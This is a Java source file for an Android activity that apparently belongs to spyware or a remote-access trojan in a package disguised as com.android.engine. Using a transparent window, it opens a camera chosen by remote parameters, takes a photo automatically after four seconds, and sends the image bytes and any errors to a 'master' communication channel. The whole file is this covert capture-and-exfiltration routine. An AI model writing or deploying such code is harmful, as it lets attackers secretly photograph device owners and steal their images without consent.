package com.android.engine.ui;

import Transfer.Action;
import android.app.Activity;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.widget.FrameLayout;
import com.android.engine.R;
import com.android.engine.ui.view.CustomSurfaceView;
import com.android.engine.SendMasterCommunication;
import com.android.engine.ExceptionAction;
import java.util.Timer;
import java.util.TimerTask;

public class CameraActivity extends Activity {

  private Camera camera;
  private CustomSurfaceView customSurfaceView;
  private PictureCallback pictureCallback;

  public CameraActivity() {
    pictureCallback = new PictureCallback() {
      public void onPictureTaken(byte[] bArr, Camera camera) {
        try {
          Action action = new Action();
          action.ACTION = 110;
          action.DATA = bArr;
          SendMasterCommunication.sendAction(action);
          finish();
        } catch (Exception e) {
          ExceptionAction.sendExceptionAction(e.getMessage());
        }
      }
    };
  }

  public static Camera openCamera(int cameraId) {
    try {
      return VERSION.SDK_INT >= 9 ? Camera.open(cameraId) : Camera.open();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
      return null;
    }
  }

  protected void onCreate(Bundle bundle) {
    try {
      super.onCreate(bundle);
      setContentView(R.layout.cam);

      setTitle("");
      setFinishOnTouchOutside(false);
      getWindow().setBackgroundDrawable(new ColorDrawable(0));
      getWindow().clearFlags(2);

      Intent intent = getIntent();
      camera = openCamera(intent.getIntExtra("CAMERA", 0));

      Parameters parameters = camera.getParameters();
      parameters.setPictureFormat(256);
      if (VERSION.SDK_INT >= 5) {
        parameters.setJpegThumbnailSize(0, 0);
        parameters.setFlashMode(intent.getStringExtra("FLASH"));
        parameters.setFocusMode(intent.getStringExtra("FOCUS"));
        parameters.setJpegQuality(intent.getIntExtra("QUALITY", 100));
      }

      try {
        camera.setParameters(parameters);
      } catch (Exception e) {
      }

      customSurfaceView = new CustomSurfaceView(this, camera);
      ((FrameLayout) findViewById(R.id.camera_preview)).addView(customSurfaceView);

      new Timer().schedule(new TimerTask() {
        public void run() {
          camera.takePicture(null, null, pictureCallback);
        }
      }, 4000);
    } catch (Exception e2) {
      ExceptionAction.sendExceptionAction(e2.getMessage());
    }
  }
}
